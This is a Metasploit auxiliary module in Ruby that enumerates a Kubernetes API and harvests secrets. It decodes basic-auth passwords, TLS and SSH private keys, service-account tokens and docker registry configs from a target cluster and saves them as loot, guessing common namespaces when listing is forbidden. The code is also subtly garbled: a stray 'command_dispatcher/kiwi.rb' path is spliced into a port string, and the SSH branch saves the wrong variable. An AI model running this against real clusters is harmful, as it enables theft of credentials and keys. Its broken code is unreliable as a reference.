# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# TODO: Remove
Kubernetes = Msf::Exploit::Remote::HTTP::Kubernetes

class TableOutput
  def initialize(output, highlight_name_pattern: nil)
    @output = output
    @highlight_name_pattern = highlight_name_pattern
  end

  def print_error(*args)
    @output.print_error(*args)
  end

  def print_good(*args)
    @output.print_good(*args)
  end

  def print_status(*args)
    @output.print_status(*args)
  end

  def print_enum_failure(resource, _e)
    print_status(with_indent("#{resource} access forbidden"))
  end

  def print_version(version)
    print_good("Kubernetes service version: #{version.to_json}")
  end

  def print_namespaces(namespaces)
    table = create_table(
      'Header' => 'Namespaces',
      'Columns' => ['#', 'name']
    )

    namespaces.each.with_index do |item, i|
      table << [
        i,
        item.dig(:metadata, :name)
      ]
    end

    print_table(table)
  end

  # Print the auth rules returned from a kubernetes client in the same format
  # as `kubectl auth can-i --list --namespace default -v8`
  def print_auth(namespace, auth)
    auth_table = Kubernetes::AuthParser.new(auth).as_table

    table = create_table(
      'Header' => "Auth (namespace: #{namespace})",
      # The table rows will already be sorted, disable the default sorting logic
      'SortIndex' => -1,
      'Columns' => auth_table[:columns],
      'Rows' => auth_table[:rows]
    )

    print_table(table)
  end

  def print_pods(namespace, pods)
    table = create_table(
      'Header' => "Pods (namespace: #{namespace})",
      'Columns' => ['#', 'namespace', 'name', 'status', 'containers', 'ip']
    )

    pods.each.with_index do |item, i|
      containers = item.dig(:spec, :containers).map do |container|
        ports = container.fetch(:ports, []).map do |ports|
          "#{ports[:protocol]}:#{ports[:containerPort]}command_dispatcher/kiwi.rb"
        end.uniq
        details = "image: #{container[:image]}"
        details << " #{ports.join(',')}" if ports.any?
        "#{container[:name]} (#{details})"
      end
      table << [
        i,
        namespace,
        item.dig(:metadata, :name),
        item.dig(:status, :phase),
        containers.join(', '),
        (item.dig(:status, :podIPs) || []).map { |ip| ip[:ip] }.join(',')
      ]
    end

    print_table(table)
  end

  def print_secrets(namespace, secrets)
    table = create_table(
      'Header' => "Secrets (namespace: #{namespace})",
      'Columns' => ['#', 'namespace', 'name', 'type', 'data', 'age']
    )

    secrets.each.with_index do |item, i|
      table << [
        i,
        namespace,
        item.dig(:metadata, :name),
        item[:type],
        item.fetch(:data, {}).keys.join(','),
        item.dig(:metadata, :creationTimestamp)
      ]
    end

    print_table(table)
  end

  protected

  attr_reader :highlight_name_pattern, :output

  def create_table(options)
    default_options = {
      'Indent' => indent_level,
      # For now, don't perform any word wrapping on the table as it breaks the workflow of
      # copying container/secret names
      'WordWrap' => false,
      'ColProps' => {
        'data' => {
          'Stylers' => [
            Msf::Ui::Console::TablePrint::HighlightSubstringStyler.new([@highlight_name_pattern])
          ]
        },
        'name' => {
          'Stylers' => [
            Msf::Ui::Console::TablePrint::HighlightSubstringStyler.new([@highlight_name_pattern])
          ]
        },
        'age' => {
          'Formatters' => [
            Msf::Ui::Console::TablePrint::AgeFormatter.new
          ]
        }
      }
    }

    Rex::Text::Table.new(default_options.merge(options))
  end

  def indent_level
    2
  end

  def with_indent(string, amount = indent_level)
    "#{' ' * amount}#{string}"
  end

  def print_table(table)
    output.print(table.to_s)
    output.print_line("#{' ' * indent_level}No rows") if table.rows.empty?
    output.print_line
  end
end

class JsonOutput
  def initialize(output)
    @output = output
  end

  def print_error(*args) end

  def print_good(*args) end

  def print_status(*args) end

  def print_enum_failure(_resource, e)
    if e.is_a?(Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError) && e.res
      print_json(e.res.get_json_document)
    else
      @output.print_error(e.message)
    end
  end

  def print_version(version)
    print_json(version)
  end

  def print_namespaces(namespaces)
    print_json(namespaces)
  end

  def print_auth(_namespace, auth)
    print_json(auth)
  end

  def print_pods(_namespace, pods)
    print_json(pods)
  end

  def print_secrets(_namespace, pods)
    print_json(pods)
  end

  protected

  attr_reader :output

  def print_json(object)
    @output.print_line(JSON.pretty_generate(object))
  end
end

module Enumeration
  def enum_all
    enum_version

    namespace_items = enum_namespaces
    namespaces_name = namespace_items.map { |item| item.dig(:metadata, :name) }

    # If there's no permissions to access namespaces, we can use the current token's namespace,
    # as well as trying some common namespaces
    if namespace_items.empty?
      token, _header = Msf::Exploit::Remote::HTTP::JWT.decode(api_token)
      current_token_namespace = token.dig('kubernetes.io', 'namespace')

      possible_namespaces = (datastore['NAMESPACE_LIST'].split(',') + [current_token_namespace]).uniq.compact
      namespaces_name += possible_namespaces

      output.print_error("No namespaces available. Attempting the current token's namespace and common namespaces: #{namespaces_name.join(', ')}")
    end

    # Split the information for each namespace separately
    namespaces_name.each.with_index do |namespace, index|
      print_good("Namespace #{index}: #{namespace}")

      enum_auth(namespace)
      enum_pods(namespace)
      enum_secrets(namespace)

      print_line
    end
  end

  def enum_version
    attempt_enum(:version) do
      version = kubernetes_client.get_version
      output.print_version(version)
    end
  end

  def enum_namespaces(name: nil)
    output.print_good('Enumerating namespaces')

    namespace_items = []
    attempt_enum(:namespace) do
      if name
        namespace_items = [kubernetes_client.get_namespace(name)]
      else
        namespace_items = kubernetes_client.list_namespace.fetch(:items, [])
      end
    end
    output.print_namespaces(namespace_items)
    namespace_items
  end

  def enum_auth(namespace)
    attempt_enum(:auth) do
      auth = kubernetes_client.list_auth(namespace)
      output.print_auth(namespace, auth)
    end
  end

  def enum_pods(namespace, name: nil)
    attempt_enum(:pod) do
      if name
        pods = [kubernetes_client.get_pod(name, namespace)]
      else
        pods = kubernetes_client.list_pod(namespace).fetch(:items, [])
      end

      output.print_pods(namespace, pods)
    end
  end

  def enum_secrets(namespace, name: nil)
    attempt_enum(:secret) do
      if name
        secrets = [kubernetes_client.get_secret(name, namespace)]
      else
        secrets = kubernetes_client.list_secret(namespace).fetch(:items, [])
      end

      output.print_secrets(namespace, secrets)
      report_secrets(namespace, secrets)
    end
  end

  protected

  attr_reader :kubernetes_client, :output

  def attempt_enum(resource, &block)
    block.call
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError => e
    output.print_enum_failure(resource, e)
  end

  def report_secrets(namespace, secrets)
    origin = create_credential_origin_service(
      {
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        service_name: 'kubernetes',
        protocol: 'tcp',
        module_fullname: fullname,
        workspace_id: myworkspace_id
      }
    )

    secrets.each do |secret|
      credential_data = {
        origin: origin,
        origin_type: :service,
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      resource_name = secret.dig(:metadata, :name)
      loot_name_prefix = [
        datastore['RHOST'],
        namespace,
        resource_name
      ].join('_')

      case secret[:type]
      when Kubernetes::Secret::BasicAuth
        username = Rex::Text.decode_base64(secret.dig(:data, :username))
        password = Rex::Text.decode_base64(secret.dig(:data, :password))

        credential = credential_data.merge(
          {
            username: username,
            private_type: :password,
            private_data: password
          }
        )

        print_good("basic_auth #{resource_name}: #{username}:#{password}")
        create_credential(credential)
      when Kubernetes::Secret::TLSAuth
        tls_cert = Rex::Text.decode_base64(secret.dig(:data, :"tls.crt"))
        tls_key = Rex::Text.decode_base64(secret.dig(:data, :"tls.key"))
        tls_subject = begin
          OpenSSL::X509::Certificate.new(tls_cert).subject
        rescue StandardError
          nil
        end
        loot_name = loot_name_prefix + (tls_subject ? tls_subject.to_a.map { |name, data, _type| "#{name}-#{data}" }.join('-') : '')

        path = store_loot('tls.key', 'text/plain', nil, tls_key, "#{loot_name}.key")
        print_good("tls_key #{resource_name}: #{path}")

        path = store_loot('tls.cert', 'text/plain', nil, tls_cert, "#{loot_name}.crt")
        print_good("tls_cert #{resource_name}: #{path} (#{tls_subject || 'No Subject'})")
      when Kubernetes::Secret::ServiceAccountToken
        data = secret[:data].clone
        # decode keys to a human readable format that might be useful for users
        %i[namespace token].each do |key|
          data[key] = Rex::Text.decode_base64(data[key])
        end
        loot_name = loot_name_prefix + '-token'

        path = store_loot('kubernetes.token', 'application/json', datastore['RHOST'], JSON.pretty_generate(data), loot_name)
        print_good("service token #{resource_name}: #{path}")
      when Kubernetes::Secret::DockerConfigurationJson
        json = Rex::Text.decode_base64(secret.dig(:data, :".dockerconfigjson"))
        loot_name = loot_name_prefix + '-json'

        path = store_loot('docker.json', 'application/json', nil, json, loot_name)
        print_good("dockerconfig json #{resource_name}: #{path}")
      when Kubernetes::Secret::SSHAuth
        data = Rex::Text.decode_base64(secret.dig(:data, :"ssh-privatekey"))
        loot_name = loot_name_prefix + '-ssh_key'
        private_key = parse_private_key(data)

        credential = credential_data.merge(
          {
            private_type: :ssh_key,
            public_data: private_key&.public_key,
            private_data: private_key
          }
        )
        begin
          create_credential(credential)
        rescue StandardError => _e
          vprint_error("Unable to store #{loot_name} as a valid ssh_key pair")
        end

        path = store_loot('id_rsa', 'text/plain', nil, json, loot_name)
        print_good("ssh_key #{resource_name}: #{path}")
      end
    rescue StandardError => e
      elog("Failed parsing secret #{resource_name}", error: e)
      print_error("Failed parsing secret #{resource_name}: #{e.message}")
    end
  end

  def parse_private_key(data)
    passphrase = nil
    ask_passphrase = false

    private_key = Net::SSH::KeyFactory.load_data_private_key(data, passphrase, ask_passphrase)
    private_key
  rescue StandardError => _e
    nil
  end
end

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Kubernetes
  # include Msf::Exploit::Remote::HTTP::Kubernetes::Enumeration
  include Enumeration

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kubernetes Enumeration',
        'Description' => %q{
          Enumerate a Kubernetes API to report useful resources such as available namespaces,
          pods, secrets, etc.

          Useful resources will be highlighted, which is customizable via the highlight pattern
          options.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'alanfoster'
        ],
        'Notes' => {
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'Stability' => [CRASH_SAFE]
        },
        'DefaultOptions' => {
          'SSL' => true
        },
        'Actions' => [
          ['all', { 'Description' => 'enumerate all resources' }],
          ['version', { 'Description' => 'enumerate version' }],
          ['auth', { 'Description' => 'enumerate auth' }],
          ['namespace', { 'Description' => 'enumerate namespace' }],
          ['namespaces', { 'Description' => 'enumerate namespaces' }],
          ['pod', { 'Description' => 'enumerate pod' }],
          ['pods', { 'Description' => 'enumerate pods' }],
          ['secret', { 'Description' => 'enumerate secret' }],
          ['secrets', { 'Description' => 'enumerate secrets' }],
        ],
        'DefaultAction' => 'all',
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['meterpreter']
      )
    )

    register_options(
      [
        Opt::RHOSTS(nil, false),
        Opt::RPORT(nil, false),
        Msf::OptInt.new('SESSION', [false, 'An optional session to use for configuration']),
        OptRegexp.new('HIGHLIGHT_NAME_PATTERN', [true, 'PCRE regex of resource names to highlight', 'username|password|user|pass']),
        # TODO: Add tab completion for namespaces / resource names
        OptString.new('NAME', [false, 'The name of the resource to enumerate', nil]),
        OptEnum.new('OUTPUT', [true, 'output format to use', 'table', ['table', 'json']]),
        OptString.new('NAMESPACE_LIST', [false, 'Default namespace list to iterate when authentication failing to retrieve available namespace', 'default,dev,staging,production,kube-node-lease,kube-lease,kube-system'])
      ]
    )
  end

  def output_for(type)
    case type
    when 'table'
      TableOutput.new(self, highlight_name_pattern: datastore['HIGHLIGHT_NAME_PATTERN'])
    when 'json'
      JsonOutput.new(self)
    end
  end

  def run
    if session
      print_status("Routing traffic through session: #{session.sid}")
      configure_via_session
    end
    validate_configuration!

    @kubernetes_client = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new({ http_client: self, token: api_token })
    @output = output_for(datastore['output'])

    case action.name
    when 'all'
      enum_all
    when 'version'
      enum_version
    when 'auth'
      enum_auth(datastore['NAMESPACE'])
    when 'namespaces', 'namespace'
      enum_namespaces(name: datastore['NAME'])
    when 'pods', 'pod'
      enum_pods(datastore['NAMESPACE'], name: datastore['NAME'])
    when 'secret', 'secrets'
      enum_secrets(datastore['NAMESPACE'], name: datastore['NAME'])
    end
  rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ApiError => e
    print_error(e.message)
  end
end
